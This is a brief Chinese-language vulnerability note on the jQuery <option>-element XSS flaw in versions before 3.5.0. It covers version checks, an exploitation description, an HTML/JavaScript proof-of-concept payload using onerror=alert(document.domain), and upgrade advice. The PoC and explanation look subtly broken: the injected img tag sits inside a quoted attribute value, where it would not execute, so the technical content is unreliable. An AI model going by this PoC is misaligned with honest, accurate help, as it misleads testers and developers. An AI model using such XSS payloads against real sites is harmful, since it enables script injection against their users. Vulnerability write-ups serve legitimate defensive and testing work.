验证漏洞存在方法
    - 检查当前页面使用的jQuery版本是否在受影响范围内（>= 1.0.3 且 < 3.5.0）
    - 检查是否存在使用jQuery DOM操作方法（如.html(), .append()等）处理用户输入的地方

漏洞利用方法
    - 该漏洞允许攻击者通过包含<option>元素的HTML注入恶意代码，即使HTML已经过清理
    - 当不受信任的HTML包含<option>元素并通过jQuery的DOM操作方法（如.html(), .append(), .prepend(), .after(), .before()等）插入到页面时，可能执行任意JavaScript代码
    - 攻击者可以构造包含恶意属性的<option>元素，当这些元素被jQuery处理时，会触发XSS攻击

PoC示例：
```html
<!-- 恶意HTML包含<option>元素 -->
<option data-x="<img src=x onerror=alert(document.domain)>"></option>

<!-- 当使用jQuery的.html()方法处理时 -->
<script>
// 受影响版本的jQuery会执行onerror中的代码
$('#target').html('<option data-x="<img src=x onerror=alert(document.domain)>"></option>');
</script>
```

注意：此漏洞在jQuery 3.5.0中已修复，建议升级到jQuery 3.5.0或更高版本。
